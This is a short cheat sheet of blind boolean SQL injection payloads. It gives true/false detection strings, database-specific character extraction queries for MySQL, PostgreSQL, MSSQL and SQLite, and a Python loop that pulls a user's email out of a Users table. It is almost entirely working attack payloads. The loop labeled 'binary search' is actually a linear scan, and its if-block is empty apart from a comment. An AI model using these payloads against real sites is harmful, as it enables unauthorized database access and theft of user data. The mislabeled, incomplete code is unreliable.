# Blind Boolean SQL Injection

## Summary
Infer data via true/false conditions when no error/union output is visible.

## Detection
```sql
# True condition
' AND 1=1-- -
' AND '1'='1

# False condition
' AND 1=2-- -
' AND '1'='2
```

Compare response bodies, lengths, or status codes.

## Extraction
```sql
# MySQL
' AND SUBSTRING((SELECT database()),1,1)='m'-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -

# PostgreSQL
' AND SUBSTRING((SELECT current_database()),1,1)='m'-- -

# MSSQL
' AND SUBSTRING((SELECT db_name()),1,1)='m'-- -

# SQLite
' AND SUBSTR((SELECT sqlite_version()),1,1)='3'-- -
```

## Automation (binary search)
```python
# For each character position, binary search ASCII value
for pos in range(1, 33):
    for ascii_char in range(32, 127):
        payload = f"' AND UNICODE(SUBSTR((SELECT email FROM Users LIMIT 1 OFFSET 0),{pos},1))>{ascii_char}-- -"
        if response_is_true(payload):
            # ascii_char is lower bound
```
